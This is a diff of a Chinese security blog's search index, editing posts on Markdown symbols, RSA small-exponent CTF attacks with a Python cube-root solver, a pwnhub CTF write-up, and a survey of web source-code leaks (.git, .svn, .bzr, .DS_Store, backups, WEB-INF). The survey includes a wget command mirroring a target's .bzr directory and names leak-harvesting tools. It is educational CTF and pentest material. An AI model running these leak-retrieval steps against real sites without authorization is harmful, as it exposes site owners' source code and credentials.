@@ -3,12 +3,10 @@
   
     
     <entry>
-      <title><![CDATA[如何在 Markdown 中打出数学符号]]></title>
+      <title><![CDATA[利用 HTML 在 Markdown 中打出数学符号]]></title>
       <url>/2018/03/28/markdown-tip/</url>
       <content type="html"><![CDATA[<p>想要打出奇奇怪怪的符号。</p>
 <a id="more"></a>
-<p>在做密码学笔记的时候遇到了一些特殊符号，无法直接打出来，一个个贴图？不存在的 XD ，后来找到了<a href="https://www.jianshu.com/p/80ac23666a98" target="_blank" rel="external">这篇文章</a>，直接用 HTML 语法打出公式符号，那就记录一些常用的语法吧。</p>
-<p>注：其他支持 Markdown 语法的地方可能会不适用。</p>
 <h2 id="1-上标"><a href="#1-上标" class="headerlink" title="1. 上标"></a>1. 上标</h2><p>n<sup>2</sup>=n+1</p>
 <p><code>n&lt;sup&gt;2&lt;/sup&gt;=n+1</code></p>
 <h2 id="2-下标"><a href="#2-下标" class="headerlink" title="2. 下标"></a>2. 下标</h2><p>a=log<sub>2</sub>b</p>
@@ -224,6 +222,10 @@
 </tbody>
 </table>
 <p>再记录一个异或符号：⊕</p>
+<p>参考文章：</p>
+<blockquote>
+<p><a href="https://www.jianshu.com/p/80ac23666a98" target="_blank" rel="external">如何在markdown中打出上标、下标和一些特殊符号</a></p>
+</blockquote>
 ]]></content>
       
         <categories>
@@ -321,7 +323,11 @@
 <h1 id="四、哈希函数"><a href="#四、哈希函数" class="headerlink" title="四、哈希函数"></a>四、哈希函数</h1><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>TODO</p>
 <h2 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h2><p>TODO</p>
 <hr>
-<h1 id="五、RSA"><a href="#五、RSA" class="headerlink" title="五、RSA"></a>五、RSA</h1><p>TODO</p>
+<h1 id="五、RSA"><a href="#五、RSA" class="headerlink" title="五、RSA"></a>五、RSA</h1><h2 id="5-1-加密原理"><a href="#5-1-加密原理" class="headerlink" title="5.1 加密原理"></a>5.1 加密原理</h2><h2 id="5-2-攻击手段"><a href="#5-2-攻击手段" class="headerlink" title="5.2 攻击手段"></a>5.2 攻击手段</h2><h3 id="1-小明文攻击"><a href="#1-小明文攻击" class="headerlink" title="1). 小明文攻击"></a>1). 小明文攻击</h3><p>e 为 3 时会产生小明文攻击。 </p>
+<p>一个简单的例子，题目给出的信息如下：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">N：<span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211</span></div><div class="line"></div><div class="line">E：<span class="number">3</span></div><div class="line"></div><div class="line">C：<span class="number">826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581</span>L</div><div class="line"></div><div class="line">flag?</div></pre></td></tr></table></figure>
+<p>exp: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/python </span></div><div class="line"><span class="comment"># coding=utf-8 </span></div><div class="line"></div><div class="line"><span class="keyword">import</span> gmpy</div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"></div><div class="line">N = <span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211</span></div><div class="line">C = <span class="number">826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581L</span></div><div class="line"></div><div class="line">k=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    (x,y)=gmpy.root(C+k*N,<span class="number">3</span>)</div><div class="line">    <span class="keyword">if</span>(y==<span class="number">1</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"flag: "</span> + libnum.n2s(x);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    k+=<span class="number">1</span></div><div class="line"></div><div class="line"><span class="comment"># flag: pwnhub&#123;f233dd92e8c379983d394ccd7c26122c&#125;</span></div></pre></td></tr></table></figure>
 <hr>
 <h1 id="六、CBC"><a href="#六、CBC" class="headerlink" title="六、CBC"></a>六、CBC</h1><p>TODO</p>
 ]]></content>
@@ -627,38 +633,6 @@
     </entry>
     
     <entry>
-      <title><![CDATA[【pwnhub 密码学专场】warmup1 & asymmetric1]]></title>
-      <url>/2017/12/22/pwnhub-%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%93%E5%9C%BA/</url>
-      <content type="html"><![CDATA[<p>pwnhub密码学公开赛里的两个题。wp交得太匆忙，写得有点简陋，没过审，下次再加油吧。</p>
-<a id="more"></a>
-<h2 id="warmup1"><a href="#warmup1" class="headerlink" title="warmup1"></a>warmup1</h2><p>LL：这是我多少年前玩剩的套路了。</p>
-<p>txt文件一片空白，二进制格式打开为一片<code>09</code>，<code>20</code>。分别用<code>1</code>与<code>0</code>替代即可，因为<code>0x09</code>代表<code>tab</code>，<code>0x20</code>代表空格，所以看不到任何东西。</p>
-<p>处理一下数据：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/python </span></div><div class="line"><span class="comment"># coding=utf-8 </span></div><div class="line"><span class="comment"># author: cyris</span></div><div class="line"></div><div class="line">s = <span class="string">'20090909 20202020 20090909 20090909 20090920 09090920 20090920 09202020 20090909 20092009 20090920 20200920 20090909 09200909 20090909 20090909 20090920 09202020 20090920 09202009 20090909 20092020 20090920 20092009 20090909 20200909 20090909 20202020 20090920 20202009 20090920 20200909 20090920 20092009 20092009 09090909 20090909 20200909 20090909 20092020 20090920 20092009 20090920 20090909 20090920 20202009 20090920 09090920 20090920 09090909 20090920 20090909 20090909 20200920 20090920 20202009 20090909 20202020 20090920 09202020 20090909 09202009 20090909 09092009'</span></div><div class="line">  </div><div class="line">temp = ((s.replace(<span class="string">'20'</span>,<span class="string">'0'</span>)).replace(<span class="string">'09'</span>, <span class="string">'1'</span>)).split()</div><div class="line">result = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp:</div><div class="line">    result.append(hex(int(i,<span class="number">2</span>)))</div><div class="line"></div><div class="line">flag_hex = <span class="string">"flag_hex: "</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> result:</div><div class="line">    flag_hex += j.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="keyword">print</span> flag_hex</div><div class="line"></div><div class="line"><span class="comment"># flag_hex: 70776e6875627b776869746573706163655f73746567616e6f6772617068797d</span></div><div class="line"><span class="comment"># flag: pwnhub&#123;whitespace_steganography&#125;</span></div></pre></td></tr></table></figure>
-<h2 id="asymmetric1"><a href="#asymmetric1" class="headerlink" title="asymmetric1"></a>asymmetric1</h2><p>题目给出的信息如下：</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">N：<span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211</span></div><div class="line"></div><div class="line">E：<span class="number">3</span></div><div class="line"></div><div class="line">C：<span class="number">826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581</span>L</div><div class="line"></div><div class="line">flag?</div></pre></td></tr></table></figure>
-<p>e为3时会产生小明文攻击。 </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/python </span></div><div class="line"><span class="comment"># coding=utf-8 </span></div><div class="line"><span class="comment"># author: cyris</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> gmpy</div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"></div><div class="line">N = <span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211</span></div><div class="line">C = <span class="number">826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581L</span></div><div class="line"></div><div class="line">k=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    (x,y)=gmpy.root(C+k*N,<span class="number">3</span>)</div><div class="line">    <span class="keyword">if</span>(y==<span class="number">1</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"flag: "</span> + libnum.n2s(x);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    k+=<span class="number">1</span></div><div class="line"></div><div class="line"><span class="comment"># flag: pwnhub&#123;f233dd92e8c379983d394ccd7c26122c&#125;</span></div></pre></td></tr></table></figure>
-]]></content>
-      
-        <categories>
-            
-            <category> CTF </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> PWNHUB </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[Jarvis OJ Writeup]]></title>
       <url>/2017/11/04/jarvisoj-wp/</url>
       <content type="html"><![CDATA[<p>记录一些 Jarvis OJ 上的题。</p>
@@ -836,16 +810,11 @@
     </entry>
     
     <entry>
-      <title><![CDATA[Web源码泄漏总结]]></title>
+      <title><![CDATA[Web 源码泄漏总结]]></title>
       <url>/2017/10/27/code-leakage/</url>
-      <content type="html"><![CDATA[<p>源码泄漏的问题经常在一些渗透测试或者CTF中出现，这篇文章对一些常见的情况做了点整理。  </p>
+      <content type="html"><![CDATA[<p>源码泄漏的问题经常在一些渗透测试或者 CTF 中出现，这篇文章对一些常见的情况做了点整理。  </p>
 <a id="more"></a>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>别看了这里没东西Σ(っ °Д °;)っ</p>
-<p>大概是强迫症想加个前言∑(O_O；)</p>
-<p>不过趁着放假还是说两句吧ᔪ꒰ ꒪ω꒪ |||꒱</p>
-<p>昨天带着小饼干跑去远远的地方搭帐篷玩耍了，很久前就买了的帐篷一直没地方用。带的东西不多，就一点零食，两只包。两个人，一片湖，一份太阳，一个下午。在包围苍天的小世界里很懒散地度过一段什么都不用去想的时间还是挺棒的。</p>
-<hr>
-<h2 id="0x01-hg源码泄漏"><a href="#0x01-hg源码泄漏" class="headerlink" title="0x01 .hg源码泄漏"></a>0x01 .hg源码泄漏</h2><p><a href="https://www.mercurial-scm.org/" target="_blank" rel="external">Mercurial</a>，一个版本管理软件。名字是水银的意思，所以用了<code>hg</code>（汞）的缩写。</p>
+<h2 id="1、-hg源码泄漏"><a href="#1、-hg源码泄漏" class="headerlink" title="1、.hg源码泄漏"></a>1、.hg源码泄漏</h2><p><a href="https://www.mercurial-scm.org/" target="_blank" rel="external">Mercurial</a>，一个版本管理软件。名字是水银的意思，所以用了<code>hg</code>（汞）的缩写。</p>
 <p>它的用法和git有点类似，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台，不像git需要MinGW才得以运行，所以也有不少人喜欢用hg进行版本管理。   </p>
 <p>其泄漏内容主要包括：</p>
 <ul>
@@ -862,7 +831,7 @@
 <li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></li>
 </ul>
 <hr>
-<h2 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02 .git源码泄漏"></a>0x02 .git源码泄漏</h2><p>在Github中被泄露的敏感信息主要包括以下几类：</p>
+<h2 id="2、-git源码泄漏"><a href="#2、-git源码泄漏" class="headerlink" title="2、.git源码泄漏"></a>2、.git源码泄漏</h2><p>在Github中被泄露的敏感信息主要包括以下几类：</p>
 <ul>
 <li>邮箱信息</li>
 <li>SVN信息</li>
@@ -881,13 +850,13 @@
 <li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a></li>
 </ul>
 <hr>
-<h2 id="0x03-bzr文件泄漏"><a href="#0x03-bzr文件泄漏" class="headerlink" title="0x03 .bzr文件泄漏"></a>0x03 .bzr文件泄漏</h2><p><a href="http://bazaar.canonical.com/en/" target="_blank" rel="external">Bazaar</a>也是一个版本管理工具，不多说了。</p>
+<h2 id="3、-bzr文件泄漏"><a href="#3、-bzr文件泄漏" class="headerlink" title="3、.bzr文件泄漏"></a>3、.bzr文件泄漏</h2><p><a href="http://bazaar.canonical.com/en/" target="_blank" rel="external">Bazaar</a>也是一个版本管理工具，不多说了。</p>
 <p><strong>漏洞成因</strong><br>在通过<code>bzr init</code>初始化项目时会在其根目录下产生名为<code>.bzr</code>的隐藏目录，同样能够暴露大量的源代码与用户信息。</p>
 <p><strong>漏洞利用</strong><br>下载.bzr文件：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -r <span class="params">--no-parent</span> <span class="params">--mirror</span> http:<span class="string">//www.target.com/.bzr</span></div></pre></td></tr></table></figure></p>
 <p>回滚版本：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bzr </span><span class="keyword">revert</span></div></pre></td></tr></table></figure></p>
 <p><strong>利用工具</strong><br>用上面提到的工具就可以。</p>
 <hr>
-<h2 id="0x04-DS-Store文件泄漏"><a href="#0x04-DS-Store文件泄漏" class="headerlink" title="0x04 .DS_Store文件泄漏"></a>0x04 .DS_Store文件泄漏</h2><p><code>.DS_Store</code>(Desktop Services Store)是macOS目录下的隐藏文件，包含了当前目录结构和一些的自定义信息，如背景和图标位置等，在windows下类似的文件为<code>desktop.ini</code>。暴露了<code>.DS_Store</code>文件也就相当于暴露了该目录下的所有内容，可以说是比较严重的泄露。    </p>
+<h2 id="4、-DS-Store文件泄漏"><a href="#4、-DS-Store文件泄漏" class="headerlink" title="4、.DS_Store文件泄漏"></a>4、.DS_Store文件泄漏</h2><p><code>.DS_Store</code>(Desktop Services Store)是macOS目录下的隐藏文件，包含了当前目录结构和一些的自定义信息，如背景和图标位置等，在windows下类似的文件为<code>desktop.ini</code>。暴露了<code>.DS_Store</code>文件也就相当于暴露了该目录下的所有内容，可以说是比较严重的泄露。    </p>
 <p>使用MacOS开发时，可以把<code>.DS_Store</code>加入忽略列表中（如<code>.gitignore</code>）, 但本质上其只是泄露目录结构, 就算删掉<code>.DS_Store</code>，文件也依然存在于Web服务器可以访问得到的地方，所以最根本的方法还是不要将敏感信息放在Web路径中。</p>
 <p><strong>漏洞成因</strong><br>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。    </p>
 <p><strong>漏洞利用</strong><br><code>.DS_Store</code>的格式为二进制，内部数据结构为<a href="https://en.wikipedia.org/wiki/Proprietary_format" target="_blank" rel="external">Proprietary</a>格式，可以自行解析并递归下载所有文件。</p>
@@ -897,7 +866,7 @@
 <li><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">ds_store_exp</a></li>
 </ul>
 <hr>
-<h2 id="0x05-svn文件泄漏"><a href="#0x05-svn文件泄漏" class="headerlink" title="0x05 .svn文件泄漏"></a>0x05 .svn文件泄漏</h2><p><a href="https://subversion.apache.org/" target="_blank" rel="external">SVN</a>也是一个版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。在git之前这也是一款比较热门的版本管理工具，但现在只有一些国企，研究院，或者比较早的项目仍在使用它进行代码管理。</p>
+<h2 id="5、-svn文件泄漏"><a href="#5、-svn文件泄漏" class="headerlink" title="5、.svn文件泄漏"></a>5、.svn文件泄漏</h2><p><a href="https://subversion.apache.org/" target="_blank" rel="external">SVN</a>也是一个版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。在git之前这也是一款比较热门的版本管理工具，但现在只有一些国企，研究院，或者比较早的项目仍在使用它进行代码管理。</p>
 <p>在SVN中泄漏的内容主要包括：</p>
 <ul>
 <li>项目的源代码</li>
@@ -914,7 +883,7 @@
 <li><a href="http://www.cnseay.com/3417/" target="_blank" rel="external">Seay-Svn</a>（一个基于windows平台的工具）</li>
 </ul>
 <hr>
-<h2 id="0x06-CVS文件泄漏"><a href="#0x06-CVS文件泄漏" class="headerlink" title="0x06 .CVS文件泄漏"></a>0x06 .CVS文件泄漏</h2><p><a href="http://www.thathost.com/wincvs-howto/cvsdoc/cvs_toc.html" target="_blank" rel="external">CVS</a>是一个年代比较久远的版本控制系统，通过它可以追踪源代码的历史变化记录。但是因为功能比较简单，而且不支持分支，所以很早前就被上面提到的svn替代了。      </p>
+<h2 id="6、-CVS文件泄漏"><a href="#6、-CVS文件泄漏" class="headerlink" title="6、.CVS文件泄漏"></a>6、.CVS文件泄漏</h2><p><a href="http://www.thathost.com/wincvs-howto/cvsdoc/cvs_toc.html" target="_blank" rel="external">CVS</a>是一个年代比较久远的版本控制系统，通过它可以追踪源代码的历史变化记录。但是因为功能比较简单，而且不支持分支，所以很早前就被上面提到的svn替代了。      </p>
 <p>因为是纯客户端的工具, 所以只会泄露源代码。</p>
 <p><strong>漏洞成因</strong><br>cvs项目在初始化(cvs checkout project)的时候，会在project目录下创建一个名为CVS的目录，其中保存了各个文件的修改和commit记录，通过此目录可以获取代码的历史版本。其中两个关键文件为：CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。</p>
 <p><strong>漏洞利用</strong><br>下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理：</p>
@@ -924,17 +893,17 @@
 <li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a>（啊没错又是这个）</li>
 </ul>
 <hr>
-<h2 id="0x07-备份文件"><a href="#0x07-备份文件" class="headerlink" title="0x07 备份文件"></a>0x07 备份文件</h2><p>备份文件泄露又分为两种情况：</p>
+<h2 id="7、备份文件"><a href="#7、备份文件" class="headerlink" title="7、备份文件"></a>7、备份文件</h2><p>备份文件泄露又分为两种情况：</p>
 <ol>
 <li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。   </li>
 <li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
 </ol>
 <p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
-<h3 id="1-Vim源码泄露"><a href="#1-Vim源码泄露" class="headerlink" title="1. Vim源码泄露"></a>1. Vim源码泄露</h3><p>如果发现页面有提示vi或者vim之类的，说明存在swp文件泄露，比如当前页面是<code>/index.php</code>，直接访问<code>/.index.php.swp</code>或者<code>/index.php~</code>，可以直接获得源码。</p>
+<h3 id="1-Vim源码泄露"><a href="#1-Vim源码泄露" class="headerlink" title="1). Vim源码泄露"></a>1). Vim源码泄露</h3><p>如果发现页面有提示vi或者vim之类的，说明存在swp文件泄露，比如当前页面是<code>/index.php</code>，直接访问<code>/.index.php.swp</code>或者<code>/index.php~</code>，可以直接获得源码。</p>
 <p>有的时候可能下载下来的文件是有一定的乱码。在linux下面执行<code>vim -r index.php</code>，可以恢复文件。</p>
-<h3 id="2-常见漏洞检测"><a href="#2-常见漏洞检测" class="headerlink" title="2. 常见漏洞检测"></a>2. 常见漏洞检测</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.rar</span></div><div class="line"><span class="selector-class">.zip</span></div><div class="line">.<span class="number">7</span>z</div><div class="line"><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-class">.bak</span></div><div class="line"><span class="selector-class">.swp</span></div><div class="line"><span class="selector-class">.txt</span></div><div class="line">.html</div></pre></td></tr></table></figure>
+<h3 id="2-常见漏洞检测"><a href="#2-常见漏洞检测" class="headerlink" title="2). 常见漏洞检测"></a>2). 常见漏洞检测</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.rar</span></div><div class="line"><span class="selector-class">.zip</span></div><div class="line">.<span class="number">7</span>z</div><div class="line"><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-class">.bak</span></div><div class="line"><span class="selector-class">.swp</span></div><div class="line"><span class="selector-class">.txt</span></div><div class="line">.html</div></pre></td></tr></table></figure>
 <hr>
-<h2 id="0x08-WEB-INF-web-xml泄漏"><a href="#0x08-WEB-INF-web-xml泄漏" class="headerlink" title="0x08 WEB-INF/web.xml泄漏"></a>0x08 WEB-INF/web.xml泄漏</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+<h2 id="8、WEB-INF-web-xml泄漏"><a href="#8、WEB-INF-web-xml泄漏" class="headerlink" title="8、WEB-INF/web.xml泄漏"></a>8、WEB-INF/web.xml泄漏</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
 <p>WEB-INF主要包含一下文件或目录：</p>
 <blockquote>
 <p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件。<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件。</p>
@@ -942,14 +911,14 @@
 <p><strong>漏洞成因</strong><br>通常一些Web应用我们会使用多个Web服务器搭配使用，解决其中的一个Web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
 <p><strong>漏洞利用</strong><br>通过web.xml文件推测应用组件相关类的名字，然后在src目录下查找代码，如果没有源代码可以直接下载class文件反编译即可。</p>
 <hr>
-<h2 id="0x09-配置文件泄露"><a href="#0x09-配置文件泄露" class="headerlink" title="0x09 配置文件泄露"></a>0x09 配置文件泄露</h2><p>现代Web开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。</p>
+<h2 id="9、配置文件泄露"><a href="#9、配置文件泄露" class="headerlink" title="9、配置文件泄露"></a>9、配置文件泄露</h2><p>现代Web开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。</p>
 <p><strong>漏洞利用</strong><br>通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好<br>常见的配置文件路径，如wordpress的/wp-config.php等，组织成字典然后用脚本进行批量测试。</p>
 <p><strong>利用工具</strong>    </p>
 <ul>
 <li><a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst" target="_blank" rel="external">参考字典</a></li>
 </ul>
 <hr>
-<h2 id="0x10-目录穿越"><a href="#0x10-目录穿越" class="headerlink" title="0x10 目录穿越"></a>0x10 目录穿越</h2><p>目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的<code>../</code>之类的目录跳转符，导致用户可以访问Web根目录的上级从而遍历服务器上的任意文件。</p>
+<h2 id="10、目录穿越"><a href="#10、目录穿越" class="headerlink" title="10、目录穿越"></a>10、目录穿越</h2><p>目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的<code>../</code>之类的目录跳转符，导致用户可以访问Web根目录的上级从而遍历服务器上的任意文件。</p>
 <p>而Web服务器本身也曾经有类似的漏洞，比如Apache Tomcat的UTF-8解析漏洞，具体利用和绕过可以参考<a href="https://zhuanlan.zhihu.com/p/21516413" target="_blank" rel="external">这篇文章</a>，这里就不展开讲啦。</p>
 <hr>
 <p> 参考文章：</p>
@@ -980,7 +949,6 @@
       <url>/2017/10/26/urllib2/</url>
       <content type="html"><![CDATA[<p>Python urllib2 模块学习笔记。</p>
 <a id="more"></a>
-<h2 id="0x01-常见用法整理"><a href="#0x01-常见用法整理" class="headerlink" title="0x01 常见用法整理"></a>0x01 常见用法整理</h2><p>这部分纯搬运自：<a href="https://lightless.me/archives/38.html" target="_blank" rel="external">Lightless - Python urllib2</a>   </p>
 <h3 id="1-通过-urllib2-获取网页内容"><a href="#1-通过-urllib2-获取网页内容" class="headerlink" title="1. 通过 urllib2 获取网页内容"></a>1. 通过 urllib2 获取网页内容</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.baidu.com'</span>)</div><div class="line">html = response.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"></div><div class="line"><span class="comment"># or</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">req = urllib2.Request(<span class="string">'http://www.baidu.com'</span>)</div><div class="line">response = urllib2.urlopen(req)</div><div class="line">the_page = response.read()</div><div class="line"><span class="keyword">print</span> the_page</div></pre></td></tr></table></figure>
 <h3 id="2-发送POST请求"><a href="#2-发送POST请求" class="headerlink" title="2. 发送POST请求"></a>2. 发送POST请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url = <span class="string">'http://www.someserver.com/register.cgi'</span></div><div class="line">values = &#123;<span class="string">'name'</span> : <span class="string">'WHY'</span>,</div><div class="line">          <span class="string">'location'</span> : <span class="string">'SDU'</span>,</div><div class="line">          <span class="string">'language'</span> : <span class="string">'Python'</span> &#125;</div><div class="line">data = urllib.urlencode(values) <span class="comment"># 编码工作</span></div><div class="line">req = urllib2.Request(url, data)  <span class="comment"># 发送请求同时传data表单</span></div><div class="line">response = urllib2.urlopen(req)  <span class="comment"># 接受反馈的信息</span></div><div class="line">the_page = response.read()  <span class="comment"># 读取反馈的内容</span></div></pre></td></tr></table></figure>
